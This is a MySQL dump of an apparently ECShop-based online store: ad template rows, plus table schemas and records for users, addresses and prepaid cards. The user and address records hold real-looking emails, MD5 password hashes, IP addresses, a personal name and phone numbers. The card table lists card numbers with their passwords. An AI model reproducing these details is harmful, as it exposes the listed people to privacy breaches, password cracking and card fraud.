INSERT INTO `ec22703249_template` VALUES ('index', '广告-首页热卖商品广告1', '/library/ad_position.lbi', '0', '14', '1', '4', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '广告-首页新品上架广告9', '/library/ad_position.lbi', '0', '13', '1', '4', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '广告-首页新品上架广告8', '/library/ad_position.lbi', '0', '12', '1', '4', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '广告-首页新品上架广告7', '/library/ad_position.lbi', '0', '11', '1', '4', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '广告-首页新品上架广告6', '/library/ad_position.lbi', '0', '10', '1', '4', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '广告-首页新品上架广告5', '/library/ad_position.lbi', '0', '9', '1', '4', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '广告-首页新品上架广告4', '/library/ad_position.lbi', '0', '8', '1', '4', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '广告-首页新品上架广告3', '/library/ad_position.lbi', '0', '7', '1', '4', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '广告-首页新品上架广告2', '/library/ad_position.lbi', '0', '6', '1', '4', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '广告-首页新品上架广告1', '/library/ad_position.lbi', '0', '5', '1', '4', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '广告-首页轮播底部广告4', '/library/ad_position.lbi', '0', '4', '1', '4', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '广告-首页轮播底部广告3', '/library/ad_position.lbi', '0', '3', '1', '4', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '广告-首页轮播底部广告2', '/library/ad_position.lbi', '0', '2', '1', '4', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '广告-首页轮播底部广告1', '/library/ad_position.lbi', '0', '1', '1', '4', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '文章-网站公告', '/library/cat_articles.lbi', '0', '8', '3', '3', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '', '/library/brands.lbi', '0', '0', '3', '0', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '', '/library/auction.lbi', '0', '0', '3', '0', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '', '/library/group_buy.lbi', '0', '0', '3', '0', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '', '/library/recommend_promotion.lbi', '0', '0', '3', '0', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '', '/library/recommend_hot.lbi', '0', '0', '6', '0', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '', '/library/recommend_new.lbi', '0', '0', '3', '0', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '', '/library/recommend_best.lbi', '0', '0', '2', '0', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '广告-首页特卖商品广告', '/library/ad_position.lbi', '0', '26', '1', '4', 'xm2013', '');

-- ----------------------------
-- Table structure for `ec22703249_topic`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_topic`;
CREATE TABLE `ec22703249_topic` (
  `topic_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL DEFAULT '''''',
  `intro` text NOT NULL,
  `start_time` int(11) NOT NULL DEFAULT '0',
  `end_time` int(10) NOT NULL DEFAULT '0',
  `data` text NOT NULL,
  `template` varchar(255) NOT NULL DEFAULT '''''',
  `css` text NOT NULL,
  `topic_img` varchar(255) DEFAULT NULL,
  `title_pic` varchar(255) DEFAULT NULL,
  `base_style` char(6) DEFAULT NULL,
  `htmls` mediumtext,
  `keywords` varchar(255) DEFAULT NULL,
  `description` varchar(255) DEFAULT NULL,
  KEY `topic_id` (`topic_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_topic
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_users`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_users`;
CREATE TABLE `ec22703249_users` (
  `user_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `email` varchar(60) NOT NULL DEFAULT '',
  `user_name` varchar(60) NOT NULL DEFAULT '',
  `password` varchar(32) NOT NULL DEFAULT '',
  `question` varchar(255) NOT NULL DEFAULT '',
  `answer` varchar(255) NOT NULL DEFAULT '',
  `sex` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `birthday` date NOT NULL DEFAULT '0000-00-00',
  `user_money` decimal(10,2) NOT NULL DEFAULT '0.00',
  `frozen_money` decimal(10,2) NOT NULL DEFAULT '0.00',
  `pay_points` int(10) unsigned NOT NULL DEFAULT '0',
  `rank_points` int(10) unsigned NOT NULL DEFAULT '0',
  `address_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `reg_time` int(10) unsigned NOT NULL DEFAULT '0',
  `last_login` int(11) unsigned NOT NULL DEFAULT '0',
  `last_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `last_ip` varchar(15) NOT NULL DEFAULT '',
  `visit_count` smallint(5) unsigned NOT NULL DEFAULT '0',
  `user_rank` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `is_special` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `ec_salt` varchar(10) DEFAULT NULL,
  `salt` varchar(10) NOT NULL DEFAULT '0',
  `parent_id` mediumint(9) NOT NULL DEFAULT '0',
  `flag` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `alias` varchar(60) NOT NULL,
  `msn` varchar(60) NOT NULL,
  `qq` varchar(20) NOT NULL,
  `office_phone` varchar(20) NOT NULL,
  `home_phone` varchar(20) NOT NULL,
  `mobile_phone` varchar(20) NOT NULL,
  `is_validated` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `credit_line` decimal(10,2) unsigned NOT NULL,
  `passwd_question` varchar(50) DEFAULT NULL,
  `passwd_answer` varchar(255) DEFAULT NULL,
  `from_date` varchar(255) DEFAULT NULL,
  `to_date` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`user_id`),
  UNIQUE KEY `user_name` (`user_name`),
  KEY `email` (`email`),
  KEY `parent_id` (`parent_id`),
  KEY `flag` (`flag`)
) ENGINE=MyISAM AUTO_INCREMENT=20 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_users
-- ----------------------------
INSERT INTO `ec22703249_users` VALUES ('1', 'zengyq@vip.qq.com', 'zengyq', 'fb591af669a58a2699b6b87830573a85', '', '', '0', '0000-00-00', '210.00', '0.00', '1888', '888', '2', '1404751708', '1407807407', '0000-00-00 00:00:00', '116.226.46.91', '14', '0', '0', '8166', '0', '0', '0', '', '', '', '', '', '', '0', '0.00', '', '', null, null);
INSERT INTO `ec22703249_users` VALUES ('2', '1003959@qq.com', 'lovelaly', 'd5aea22df430b0668cf1a7561e57b00e', '', '', '0', '0000-00-00', '100.00', '0.00', '1888', '888', '0', '1404932076', '1407174112', '0000-00-00 00:00:00', '223.92.46.223', '11', '0', '0', '2827', '0', '0', '0', '', '', '', '', '', '', '0', '0.00', '', '', null, null);
INSERT INTO `ec22703249_users` VALUES ('3', '282416127@qq.com', 'zyq', 'a5c20f8b44225918374529fdbefd82c0', '', '', '0', '0000-00-00', '0.00', '0.00', '888', '888', '0', '1405447895', '1405447895', '0000-00-00 00:00:00', '116.226.37.139', '1', '0', '0', '', '0', '0', '0', '', '', '', '', '', '', '0', '0.00', '', '', null, null);
INSERT INTO `ec22703249_users` VALUES ('4', '', 'weixin344', 'dbe802cad9fbfa3e1e324c11a687be0f', '', '', '0', '0000-00-00', '0.00', '0.00', '0', '0', '0', '0', '0', '0000-00-00 00:00:00', '', '0', '0', '0', '', '0', '0', '0', '', '', '', '', '', '', '0', '0.00', '', '', null, null);
INSERT INTO `ec22703249_users` VALUES ('5', 'shi7881qiao@hotmail.com', 'fhh', '2fbdfef7a3d84e312e3613a9b5e3b645', '', '', '0', '1954-01-01', '0.00', '0.00', '888', '888', '1', '1405453307', '1405884098', '0000-00-00 00:00:00', '180.173.198.176', '6', '0', '0', '5110', '0', '0', '0', '', '', '', '', '', '', '0', '0.00', '', '', null, null);
INSERT INTO `ec22703249_users` VALUES ('6', '', 'weixin345', 'eba1925172ec865fdcb4f28515dcaf98', '', '', '0', '0000-00-00', '0.00', '0.00', '0', '0', '0', '0', '0', '0000-00-00 00:00:00', '', '0', '0', '0', '', '0', '0', '0', '', '', '', '', '', '', '0', '0.00', '', '', null, null);
INSERT INTO `ec22703249_users` VALUES ('7', '', 'weixin346', 'c49aebda755b2ea84ec293564063deb5', '', '', '0', '0000-00-00', '0.00', '0.00', '0', '0', '0', '0', '0', '0000-00-00 00:00:00', '', '0', '0', '0', '', '0', '0', '0', '', '', '', '', '', '', '0', '0.00', '', '', null, null);
INSERT INTO `ec22703249_users` VALUES ('8', '', 'weixin347', '88f45dcd6f2324620358ea266b09be68', '', '', '0', '0000-00-00', '0.00', '0.00', '0', '0', '0', '0', '0', '0000-00-00 00:00:00', '', '0', '0', '0', '', '0', '0', '0', '', '', '', '', '', '', '0', '0.00', '', '', null, null);
INSERT INTO `ec22703249_users` VALUES ('9', '', 'weixin348', '81fec8833176e92295bfdd3006cb5f56', '', '', '0', '0000-00-00', '0.00', '0.00', '0', '0', '0', '0', '0', '0000-00-00 00:00:00', '', '0', '0', '0', '', '0', '0', '0', '', '', '', '', '', '', '0', '0.00', '', '', null, null);
INSERT INTO `ec22703249_users` VALUES ('10', '', 'weixin349', '7e8f4f8ce02358b500ecda99f9ade56e', '', '', '0', '0000-00-00', '0.00', '0.00', '0', '0', '0', '0', '0', '0000-00-00 00:00:00', '', '0', '0', '0', '', '0', '0', '0', '', '', '', '', '', '', '0', '0.00', '', '', null, null);
INSERT INTO `ec22703249_users` VALUES ('11', '', 'weixin350', '7a5928130327d626849c634d9f9e307f', '', '', '0', '0000-00-00', '0.00', '0.00', '0', '0', '0', '0', '0', '0000-00-00 00:00:00', '', '0', '0', '0', '', '0', '0', '0', '', '', '', '', '', '', '0', '0.00', '', '', null, null);
INSERT INTO `ec22703249_users` VALUES ('12', '', 'weixin351', '7da22e27df069ebb8cdaf925a3cf6acc', '', '', '0', '0000-00-00', '0.00', '0.00', '0', '0', '0', '0', '1406417936', '0000-00-00 00:00:00', '221.9.247.226', '1', '0', '0', '878', '0', '0', '0', '', '', '', '', '', '', '0', '0.00', '', '', null, null);
INSERT INTO `ec22703249_users` VALUES ('13', '', 'weixin352', '69d374db49d97b5edeafae50ee1ce87b', '', '', '0', '0000-00-00', '0.00', '0.00', '0', '0', '0', '0', '0', '0000-00-00 00:00:00', '', '0', '0', '0', '', '0', '0', '0', '', '', '', '', '', '', '0', '0.00', '', '', null, null);
INSERT INTO `ec22703249_users` VALUES ('14', '', 'weixin353', '830e0a8d17432617876879c89795468c', '', '', '0', '0000-00-00', '0.00', '0.00', '0', '0', '0', '0', '0', '0000-00-00 00:00:00', '', '0', '0', '0', '', '0', '0', '0', '', '', '', '', '', '', '0', '0.00', '', '', null, null);
INSERT INTO `ec22703249_users` VALUES ('15', '', 'weixin354', 'dc43e5275fd1a4049eff38fff31172c8', '', '', '0', '0000-00-00', '0.00', '0.00', '0', '0', '0', '0', '0', '0000-00-00 00:00:00', '', '0', '0', '0', '', '0', '0', '0', '', '', '', '', '', '', '0', '0.00', '', '', null, null);
INSERT INTO `ec22703249_users` VALUES ('16', 'shoptest@126.com', 'shoptest', '3c4bf2541161f8694929d51b75e0242c', '', '', '0', '1954-01-01', '0.00', '0.00', '0', '0', '3', '1407884332', '1407898034', '0000-00-00 00:00:00', '101.80.57.121', '3', '0', '0', '7158', '0', '0', '0', '', '', '', '', '', '', '0', '0.00', '', '', null, null);
INSERT INTO `ec22703249_users` VALUES ('17', '1111111@qq.com', 'hellotiger', '344ce20d9a31d609cac3e7d020e8ed3c', '', '', '0', '2009-07-06', '9545.50', '0.00', '6888', '888', '4', '1407978012', '1408325235', '0000-00-00 00:00:00', '127.0.0.1', '15', '0', '0', '4338', '0', '0', '0', '', '', '234234', '弟子的', '12313', '13233223232', '0', '0.00', null, null, '1408291200', '1408550399');
INSERT INTO `ec22703249_users` VALUES ('18', 'hellotigers@qq.com', 'hellotigers', '268daad85e41532640f7b29bc5a83eee', '', '', '0', '1954-01-01', '0.00', '0.00', '888', '888', '8', '1408243095', '1408243095', '0000-00-00 00:00:00', '127.0.0.1', '1', '0', '0', null, '0', '0', '0', '', 'hellotigers', 'hellotigers', 'hellotigers', '', 'hellotigers', '0', '0.00', null, null, '1408291200', '1408636799');
INSERT INTO `ec22703249_users` VALUES ('19', 'bcfauvey@gmail.com', 'tst', 'fcea920f7412b5da7be0cf42b8c93759', '', '', '0', '1954-01-01', '0.00', '0.00', '0', '0', '0', '1408332635', '0', '0000-00-00 00:00:00', '', '0', '0', '0', null, '0', '0', '0', '', '', '21640', '', '', '', '0', '0.00', null, null, '1406822400', '1407167999');

-- ----------------------------
-- Table structure for `ec22703249_user_account`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_user_account`;
CREATE TABLE `ec22703249_user_account` (
  `id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `admin_user` varchar(255) NOT NULL,
  `amount` decimal(10,2) NOT NULL,
  `add_time` int(10) NOT NULL DEFAULT '0',
  `paid_time` int(10) NOT NULL DEFAULT '0',
  `admin_note` varchar(255) NOT NULL,
  `user_note` varchar(255) NOT NULL,
  `process_type` tinyint(1) NOT NULL DEFAULT '0',
  `payment` varchar(90) NOT NULL,
  `is_paid` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`),
  KEY `is_paid` (`is_paid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_user_account
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_user_address`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_user_address`;
CREATE TABLE `ec22703249_user_address` (
  `address_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `address_name` varchar(50) NOT NULL DEFAULT '',
  `user_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `consignee` varchar(60) NOT NULL DEFAULT '',
  `email` varchar(60) NOT NULL DEFAULT '',
  `country` smallint(5) NOT NULL DEFAULT '0',
  `province` smallint(5) NOT NULL DEFAULT '0',
  `city` smallint(5) NOT NULL DEFAULT '0',
  `district` smallint(5) NOT NULL DEFAULT '0',
  `address` varchar(120) NOT NULL DEFAULT '',
  `zipcode` varchar(60) NOT NULL DEFAULT '',
  `tel` varchar(60) NOT NULL DEFAULT '',
  `mobile` varchar(60) NOT NULL DEFAULT '',
  `sign_building` varchar(120) NOT NULL DEFAULT '',
  `best_time` varchar(120) NOT NULL DEFAULT '',
  PRIMARY KEY (`address_id`),
  KEY `user_id` (`user_id`)
) ENGINE=MyISAM AUTO_INCREMENT=9 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_user_address
-- ----------------------------
INSERT INTO `ec22703249_user_address` VALUES ('1', '', '5', 'CBB', 'shi7881qiao@hotmail.com', '1', '13', '180', '1544', 'CVMNMM,', '200123', '50201056', '13685634255', '', '周三');
INSERT INTO `ec22703249_user_address` VALUES ('2', '', '1', '曾媛卿', 'zengyq@vip.qq.com', '0', '0', '0', '0', '', '', '13817277868', '', '', '');
INSERT INTO `ec22703249_user_address` VALUES ('3', '', '16', '测试', 'shoptest@126.com', '0', '0', '0', '0', '', '', '13052083496', '', '', '');
INSERT INTO `ec22703249_user_address` VALUES ('4', '', '17', 'hello22', '1111111@qq.com', '1', '6', '79', '717', '12313', '234234', '13222323232', '13222323232', '', '');
INSERT INTO `ec22703249_user_address` VALUES ('5', '', '18', '', '', '0', '0', '0', '0', '', '', '', '', '', '');
INSERT INTO `ec22703249_user_address` VALUES ('6', '', '18', '', '', '0', '0', '0', '0', '', '', '', '', '', '');
INSERT INTO `ec22703249_user_address` VALUES ('7', '', '18', '', '', '0', '0', '0', '0', '', '', '', '', '', '');
INSERT INTO `ec22703249_user_address` VALUES ('8', '', '18', '', '', '0', '0', '0', '0', '', '', '', '', '', '');

-- ----------------------------
-- Table structure for `ec22703249_user_bonus`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_user_bonus`;
CREATE TABLE `ec22703249_user_bonus` (
  `bonus_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `bonus_type_id` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `bonus_sn` bigint(20) unsigned NOT NULL DEFAULT '0',
  `user_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `used_time` int(10) unsigned NOT NULL DEFAULT '0',
  `order_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `emailed` tinyint(3) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`bonus_id`),
  KEY `user_id` (`user_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_user_bonus
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_user_card`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_user_card`;
CREATE TABLE `ec22703249_user_card` (
  `id` int(20) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `ct_id` int(10) unsigned NOT NULL DEFAULT '0',
  `card_level` varchar(60) NOT NULL DEFAULT '',
  `card_no` varchar(60) NOT NULL DEFAULT '',
  `card_pass` varchar(60) NOT NULL DEFAULT '',
  `card_status` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `send_type` varchar(60) NOT NULL DEFAULT '',
  `add_time` int(10) unsigned NOT NULL DEFAULT '0',
  `bind_time` int(10) unsigned NOT NULL DEFAULT '0',
  `user_money` decimal(10,2) NOT NULL DEFAULT '0.00',
  `pay_points` int(10) unsigned NOT NULL DEFAULT '0',
  `rank_points` int(10) unsigned NOT NULL DEFAULT '0',
  `true_name` varchar(60) NOT NULL DEFAULT '',
  `address` varchar(255) NOT NULL DEFAULT '',
  `mobile` varchar(60) NOT NULL DEFAULT '',
  `email` varchar(60) NOT NULL DEFAULT '',
  `sex` varchar(10) NOT NULL DEFAULT '',
  `is_show` int(1) unsigned NOT NULL DEFAULT '0',
  `des` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`),
  UNIQUE KEY `card_no` (`card_no`),
  KEY `user_id` (`user_id`)
) ENGINE=MyISAM AUTO_INCREMENT=2003 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_user_card
-- ----------------------------
INSERT INTO `ec22703249_user_card` VALUES ('1017', '0', '1', '', '00017', '28151091', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1016', '0', '1', '', '00016', '66565069', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1015', '0', '1', '', '00015', '97839664', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1014', '0', '1', '', '00014', '17084015', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1013', '0', '1', '', '00013', '70446646', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1001', '1', '4', '', '00001', '1179385387', '1', '', '1406247892', '1406248008', '0.00', '0', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1002', '0', '1', '', '00002', '63226686', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1003', '0', '1', '', '00003', '99941381', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1004', '0', '1', '', '00004', '88021973', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1005', '0', '1', '', '00005', '84854100', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1504', '0', '1', '', '00504', '99825996', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1503', '0', '1', '', '00503', '74922122', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1502', '0', '1', '', '00502', '24232509', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1501', '0', '1', '', '00501', '98249781', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1500', '0', '1', '', '00500', '27134516', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1499', '0', '1', '', '00499', '59117608', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1498', '0', '1', '', '00498', '81959433', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1497', '0', '1', '', '00497', '74292013', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1496', '0', '1', '', '00496', '22510496', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1495', '0', '1', '', '00495', '26514197', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1494', '0', '1', '', '00494', '10643889', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1493', '0', '1', '', '00493', '89368438', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1492', '0', '1', '', '00492', '11835795', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1491', '0', '1', '', '00491', '78956091', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1490', '0', '1', '', '00490', '28444173', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1489', '0', '1', '', '00489', '29800167', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1488', '0', '1', '', '00488', '60430282', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1487', '0', '1', '', '00487', '65498082', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1486', '0', '1', '', '00486', '57701268', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1485', '0', '1', '', '00485', '36359710', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1484', '0', '1', '', '00484', '74137665', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1483', '0', '1', '', '00483', '69177701', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1482', '0', '1', '', '00482', '29391043', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1481', '0', '1', '', '00481', '79303211', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1480', '0', '1', '', '00480', '92124199', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1479', '0', '1', '', '00479', '21197831', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1478', '0', '1', '', '00478', '32398121', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1477', '0', '1', '', '00477', '43011761', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1476', '0', '1', '', '00476', '88403607', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1475', '0', '1', '', '00475', '70449187', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1474', '0', '1', '', '00474', '55435008', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1473', '0', '1', '', '00473', '59516925', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1472', '0', '1', '', '00472', '45950461', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1471', '0', '1', '', '00471', '35027617', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1470', '0', '1', '', '00470', '20651495', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1469', '0', '1', '', '00469', '16836231', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1468', '0', '1', '', '00468', '54932843', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1467', '0', '1', '', '00467', '66478741', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1466', '0', '1', '', '00466', '98267042', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1465', '0', '1', '', '00465', '24301880', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1464', '0', '1', '', '00464', '36717845', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1463', '0', '1', '', '00463', '63862067', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1462', '0', '1', '', '00462', '32169715', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1461', '0', '1', '', '00461', '27622096', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1460', '0', '1', '', '00460', '91812609', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1459', '0', '1', '', '00459', '59890494', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1458', '0', '1', '', '00458', '48844577', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1457', '0', '1', '', '00457', '53551077', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1456', '0', '1', '', '00456', '13310114', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1455', '0', '1', '', '00455', '77376646', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1454', '0', '1', '', '00454', '79002449', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1453', '0', '1', '', '00453', '94066370', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1452', '0', '1', '', '00452', '98685386', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
